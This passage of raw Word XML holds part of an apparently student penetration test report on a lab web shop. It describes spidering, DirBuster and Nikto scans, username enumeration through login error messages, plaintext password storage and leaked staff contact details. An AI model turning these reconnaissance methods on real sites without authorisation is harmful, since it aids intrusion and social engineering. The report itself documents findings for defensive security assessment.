          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Add/edit/delete P</w:t>
      </w:r>
      <w:r w:rsidR="00535B28">
        <w:t>roducts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A60F26D" w14:textId="4D1355D1" w:rsidR="00535B28" w:rsidRDefault="00A71FAE" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Add/edit/delete W</w:t>
      </w:r>
      <w:r w:rsidR="00535B28">
        <w:t>arehouses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7441359B" w14:textId="5811AE63" w:rsidR="00535B28" w:rsidRDefault="00A71FAE" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Add/edit/delete C</w:t>
      </w:r>
      <w:r w:rsidR="00535B28">
        <w:t>ategories</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B27ED0" w14:textId="106D7225" w:rsidR="00535B28" w:rsidRDefault="00A71FAE" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Add/edit/delete O</w:t>
      </w:r>
      <w:r w:rsidR="00535B28">
        <w:t>rders</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB79CA5" w14:textId="5949E1EA" w:rsidR="00535B28" w:rsidRDefault="00A71FAE" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Add/edit/delete C</w:t>
      </w:r>
      <w:r w:rsidR="00535B28">
        <w:t>ustomer details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750150C9" w14:textId="0DE741E1" w:rsidR="00535B28" w:rsidRDefault="00A71FAE" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Backup the D</w:t>
      </w:r>
      <w:r w:rsidR="00535B28">
        <w:t>atabase</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C87D6C5" w14:textId="443BA1BD" w:rsidR="00875A29" w:rsidRDefault="009971B4" w:rsidP="00875A29">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">In the admin page it is possible to view </w:t>
      </w:r>
      <w:r w:rsidR="004979D8">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00C12B0A">
        <w:t>page that contains all the customer details</w:t>
      </w:r>
      <w:r w:rsidR="009137D6">
        <w:t>. Contained within this page is</w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t xml:space="preserve"> the username and password for </w:t>
      </w:r>
      <w:r w:rsidR="009137D6">
        <w:t xml:space="preserve">all </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r w:rsidR="009137D6">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>customer accounts. T</w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t>his inf</w:t>
      </w:r>
      <w:r w:rsidR="00C12B0A">
        <w:t xml:space="preserve">ormation is stored in </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00C12B0A">
        <w:t>plaintext,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00C12B0A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t>therefore no decryption is required to view it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED5A4DE" w14:textId="023826C5" w:rsidR="00A71FAE" w:rsidRDefault="00A71FAE" w:rsidP="00535B28">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>As well as these features, the admin can also upload a fil</w:t>
      </w:r>
      <w:r w:rsidR="004B444E">
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r w:rsidR="009971B4">
        <w:t>when updating the categories, e</w:t>
      </w:r>
      <w:r w:rsidR="002000BF">
        <w:t>m</w:t>
      </w:r>
      <w:r w:rsidR="009971B4">
        <w:t xml:space="preserve">ployees and </w:t>
      </w:r>
      <w:r w:rsidR="002000BF">
        <w:t>pr</w:t>
      </w:r>
      <w:r w:rsidR="00726826">
        <w:t>oduct</w:t>
      </w:r>
      <w:r w:rsidR="002000BF">
        <w:t xml:space="preserve"> sections</w:t>
      </w:r>
      <w:r w:rsidR="004B444E">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668E2E29" w14:textId="77777777" w:rsidR="00131110" w:rsidRDefault="00131110" w:rsidP="00535B28">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00131110">
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Results from the Spider</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778DB867" w14:textId="34B189CF" w:rsidR="00131110" w:rsidRDefault="00131110" w:rsidP="00535B28">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00131110">
        <w:t>Using OWASP-ZAP</w:t>
      </w:r>
      <w:r w:rsidR="001A29F9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001A29F9" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(OWASP Zed Attack Proxy Project - OWASP, 2018)</w:t>
      </w:r>
      <w:r w:rsidR="00B42C6B">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="009137D6">
        <w:t>a large amount</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> URLs that the site </w:t>
      </w:r>
      <w:r w:rsidR="00C12B0A">
        <w:t>uses</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> were found. These can be seen in Appendix A. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E83BA3" w14:textId="15D3557D" w:rsidR="00131110" w:rsidRDefault="002000BF" w:rsidP="00535B28">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Figure 1 shows a site map that was created using Burp Suite</w:t>
      </w:r>
      <w:r w:rsidR="001A29F9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001A29F9" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">(Burp Suite Scanner | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001A29F9" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>PortSwigger</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001A29F9" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>, 2018)</w:t>
      </w:r>
      <w:r w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00131110">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72448533" w14:textId="77777777" w:rsidR="00161A28" w:rsidRDefault="00161A28" w:rsidP="00161A28">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="66450BD8" wp14:editId="7F7729BE">
            <wp:extent cx="6808703" cy="285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91569" cy="2892277"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A550160" w14:textId="2201F0B9" w:rsidR="00895EDB" w:rsidRDefault="00161A28" w:rsidP="00A71FAE">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Spider map</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2279A4" w14:textId="77777777" w:rsidR="00895EDB" w:rsidRDefault="00895EDB" w:rsidP="00895EDB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc531104325"/>
      <w:r w:rsidRPr="00895EDB">
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Discover Hidden Content</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="17A18A82" w14:textId="7E7DEDF7" w:rsidR="001F43BC" w:rsidRPr="001F43BC" w:rsidRDefault="00895EDB" w:rsidP="0030505C">
      <w:r>
        <w:t xml:space="preserve">In this section, </w:t>
      </w:r>
      <w:r w:rsidR="00C12B0A">
        <w:t>certain areas</w:t>
      </w:r>
      <w:r w:rsidR="002000BF">
        <w:t xml:space="preserve"> of the website that allow user input</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will be </w:t>
      </w:r>
      <w:r w:rsidR="009137D6">
        <w:t>explored and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tested with numerous </w:t>
      </w:r>
      <w:r w:rsidR="009137D6">
        <w:t>types of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009137D6">
        <w:t xml:space="preserve">valid and invalid </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">inputs. </w:t>
      </w:r>
      <w:r w:rsidR="00CA4F6A">
        <w:t xml:space="preserve">The aim of this is to see how the server handles </w:t>
      </w:r>
      <w:r w:rsidR="000F7AE8">
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="00CA4F6A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000F7AE8">
        <w:t>request and what response is given</w:t>
      </w:r>
      <w:r w:rsidR="00CA4F6A">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t>The HTML code will be looked at to see if there are any clues about what would b</w:t>
      </w:r>
      <w:r w:rsidR="001F43BC">
        <w:t xml:space="preserve">e classed as valid or invalid. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4B4F81" w14:textId="3BC6F619" w:rsidR="0068040C" w:rsidRDefault="00CD3F64" w:rsidP="0030505C">
      <w:r>
        <w:t>The login field will be supplied with</w:t>
      </w:r>
      <w:r w:rsidR="00C13D50">
        <w:t xml:space="preserve"> known</w:t>
      </w:r>
      <w:r w:rsidR="0030505C" w:rsidRPr="0030505C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0030505C">
        <w:t xml:space="preserve">invalid input and known valid input (the provided username). When </w:t>
      </w:r>
      <w:r w:rsidR="004B3E07">
        <w:t xml:space="preserve">the input </w:t>
      </w:r>
      <w:r w:rsidR="0030505C">
        <w:t>supplied</w:t>
      </w:r>
      <w:r w:rsidR="004B3E07">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A71FAE">
        <w:t xml:space="preserve">in the username field </w:t>
      </w:r>
      <w:r w:rsidR="004B3E07">
        <w:t>is invalid</w:t>
      </w:r>
      <w:r w:rsidR="0030505C">
        <w:t>, a text box pops up displaying “Username not found.”</w:t>
      </w:r>
      <w:r w:rsidR="004B3E07">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="0068040C">
        <w:t xml:space="preserve">If the website is given a valid username, but invalid password, then no message is displayed. </w:t>
      </w:r>
      <w:r w:rsidR="0030505C">
        <w:t xml:space="preserve">From this information, it is possible to derive when the web application handles a valid username. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44712FF4" w14:textId="351FCAD9" w:rsidR="00712204" w:rsidRDefault="0068040C" w:rsidP="0030505C">
      <w:r>
        <w:t xml:space="preserve">When attempting to sign in to the admin page, if the credentials are </w:t>
      </w:r>
      <w:r w:rsidR="0023027D">
        <w:t>valid</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then </w:t>
      </w:r>
      <w:r w:rsidR="0023027D">
        <w:t xml:space="preserve">the admin page is loaded. However, if they are invalid then the page takes you to </w:t>
      </w:r>
      <w:hyperlink r:id="rId13" w:history="1">
        <w:r w:rsidR="0023027D" w:rsidRPr="00ED63FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/Sign%20In.php</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0023027D">
        <w:t xml:space="preserve">. This </w:t>
      </w:r>
      <w:r w:rsidR="0023027D">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">page shows an error message with </w:t>
      </w:r>
      <w:r w:rsidR="002000BF">
        <w:t>information</w:t>
      </w:r>
      <w:r w:rsidR="0023027D">
        <w:t xml:space="preserve"> about the webserver currently running.</w:t>
      </w:r>
      <w:r w:rsidR="00DE0AE7">
        <w:t xml:space="preserve"> The error message can be seen in Figure 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667532A5" w14:textId="77777777" w:rsidR="00DE0AE7" w:rsidRDefault="00DE0AE7" w:rsidP="00DE0AE7">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="43A576A1" wp14:editId="73690AC0">
            <wp:extent cx="5943600" cy="16884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688465"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7594F1FF" w14:textId="0F45E6BA" w:rsidR="00DE0AE7" w:rsidRDefault="00DE0AE7" w:rsidP="00DE0AE7">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2</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Sign in page error message</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45496BE0" w14:textId="3BB76349" w:rsidR="00712204" w:rsidRDefault="00712204" w:rsidP="0030505C">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Dirbuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0081487D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0081487D" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="0081487D" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Category:OWASP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="0081487D" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0081487D" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>DirBuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0081487D" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> Project - OWASP, 2018)</w:t>
      </w:r>
      <w:r w:rsidR="00730DB0">
        <w:t xml:space="preserve"> was</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> used in an attempt to search for co</w:t>
      </w:r>
      <w:r w:rsidR="00A71FAE">
        <w:t xml:space="preserve">mmon files and directory names </w:t>
      </w:r>
      <w:r>
        <w:t>that were not found by the spider.</w:t>
      </w:r>
      <w:r w:rsidR="008831CC">
        <w:t xml:space="preserve"> The results</w:t>
      </w:r>
      <w:r w:rsidR="00DE0AE7">
        <w:t xml:space="preserve"> from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DE0AE7">
        <w:t>Dirbuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DE0AE7">
        <w:t xml:space="preserve"> can be seen in A</w:t>
      </w:r>
      <w:r w:rsidR="008831CC">
        <w:t xml:space="preserve">ppendix B. Numerous URLs were found, and after matching them against the ones previously found, </w:t>
      </w:r>
      <w:r w:rsidR="005710C2">
        <w:t>forty-two new URLs have</w:t>
      </w:r>
      <w:r w:rsidR="00DE0AE7">
        <w:t xml:space="preserve"> been found. The new</w:t>
      </w:r>
      <w:r w:rsidR="006A5C61">
        <w:t xml:space="preserve"> URLs are seen at the </w:t>
      </w:r>
      <w:r w:rsidR="005710C2">
        <w:t>end</w:t>
      </w:r>
      <w:r w:rsidR="006A5C61">
        <w:t xml:space="preserve"> of Appendix B</w:t>
      </w:r>
      <w:r w:rsidR="0052585A">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0568C6FB" w14:textId="7712533C" w:rsidR="00AA6014" w:rsidRDefault="00AA6014" w:rsidP="0030505C">
      <w:r>
        <w:t>On the contact us page</w:t>
      </w:r>
      <w:r w:rsidR="009C368C">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">the email address used for the company information </w:t>
      </w:r>
      <w:r w:rsidR="009C368C">
        <w:t xml:space="preserve">is </w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:history="1">
        <w:r w:rsidR="009C368C" w:rsidRPr="00D8289A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009C368C">
        <w:t>. Because this is a valid email for a user, it is not recommended to display this on the page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5A8C7A" w14:textId="44217292" w:rsidR="005509E2" w:rsidRPr="005509E2" w:rsidRDefault="005509E2" w:rsidP="005509E2">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005509E2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>If the user views the html code on the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005509E2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>profile.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005509E2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> page, then there is a comment that displays the text “</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005509E2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>&lt;!--</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005509E2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> *** Denis Smith, d.smith@hacklab.com, phone number 01382 99999. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005509E2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005509E2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> expert. --&gt;”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">. This information could be used to mount an attack, whether through social engineering, or attempting to use the email address as a username. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15101950" w14:textId="7396DD30" w:rsidR="005509E2" w:rsidRDefault="005509E2" w:rsidP="0030505C"/>
    <w:p w14:paraId="07DC2D27" w14:textId="77777777" w:rsidR="00895EDB" w:rsidRDefault="003023A3" w:rsidP="003023A3">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc531104326"/>
      <w:r w:rsidRPr="003023A3">
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Discover Default Content</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="7E3D585E" w14:textId="15B6CEC6" w:rsidR="00FF7636" w:rsidRDefault="003023A3" w:rsidP="003023A3">
      <w:r>
        <w:t>The web server will be scanned fo</w:t>
      </w:r>
      <w:r w:rsidR="00AA1E24">
        <w:t>r default content. In A</w:t>
      </w:r>
      <w:r w:rsidR="008831CC">
        <w:t>ppendix C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="008831CC">
        <w:t>the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00501E2B">
        <w:t xml:space="preserve">output from running </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00501E2B">
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="008831CC">
        <w:t>ikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00BC6B88" w:rsidRPr="00BC6B88">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00BC6B88" w:rsidRPr="00BC6B88">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Chapter 4. Command Line Options, 2018)</w:t>
      </w:r>
      <w:r w:rsidR="008831CC">
        <w:t xml:space="preserve"> against the web server can be seen. </w:t>
      </w:r>
      <w:r w:rsidR="00FF7636">
        <w:t xml:space="preserve">From the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FF7636">
        <w:t>Nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FF7636">
        <w:t xml:space="preserve"> scans, the following information is </w:t>
      </w:r>
      <w:r w:rsidR="00730DB0">
        <w:t>found</w:t>
      </w:r>
      <w:r w:rsidR="00FF7636">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12740D4E" w14:textId="77777777" w:rsidR="00FF7636" w:rsidRDefault="00FF7636" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Server: </w:t>
      </w:r>
      <w:r w:rsidRPr="00FF7636">
        <w:t>Apache/2.4.3 (Unix) OpenSSL/1.0.1c PHP/5.4.7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092F2642" w14:textId="303DA249" w:rsidR="00FF7636" w:rsidRDefault="00FF7636" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The cookie PHPSESSID is created without the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>httponly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> flag </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DB58F0" w14:textId="77777777" w:rsidR="00FF7636" w:rsidRDefault="00FF7636" w:rsidP="00875A29">
